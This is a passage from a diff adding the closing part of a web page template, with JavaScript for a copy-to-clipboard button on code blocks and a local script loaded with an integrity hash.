+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+        codeblock.parentNode.appendChild(copybutton);
+    });
+</script></main>
+    </body>
+  
+  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
